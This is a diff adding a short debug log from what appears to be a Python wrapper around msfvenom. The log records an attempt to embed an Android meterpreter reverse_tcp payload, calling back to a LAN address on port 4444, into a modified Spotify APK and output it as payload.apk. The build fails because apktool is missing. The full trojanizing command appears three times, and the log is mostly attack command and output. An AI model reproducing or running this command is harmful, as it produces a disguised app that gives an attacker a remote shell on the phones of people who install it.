@@ -1,0 +1,9 @@
+DEBUG:root:Creating the APK representation (using ../Spotify-v8.4.46.575.APK.Anti-Ban.apk)
+INFO:root:Generating payload...
+DEBUG:root:Executing command: 'msfvenom -x ../Spotify-v8.4.46.575.APK.Anti-Ban.apk -p android/meterpreter/reverse_tcp LHOST=192.168.1.187 LPORT=4444 -o /home/andrea/Desktop/CyberSecurity/src/payload.apk'
+DEBUG:root:Using APK template: ../Spotify-v8.4.46.575.APK.Anti-Ban.apk
+DEBUG:root:[-] No platform was selected, choosing Msf::Module::Platform::Android from the payload
+DEBUG:root:[-] No arch selected, selecting arch: dalvik from the payload
+DEBUG:root:Error: apktool not found. If it's not in your PATH, please add it.
+CRITICAL:root:The command 'msfvenom -x ../Spotify-v8.4.46.575.APK.Anti-Ban.apk -p android/meterpreter/reverse_tcp LHOST=192.168.1.187 LPORT=4444 -o /home/andrea/Desktop/CyberSecurity/src/payload.apk' exited with non-zero code
+CRITICAL:root:RuntimeError --- The command 'msfvenom -x ../Spotify-v8.4.46.575.APK.Anti-Ban.apk -p android/meterpreter/reverse_tcp LHOST=192.168.1.187 LPORT=4444 -o /home/andrea/Desktop/CyberSecurity/src/payload.apk' exited with non-zero code
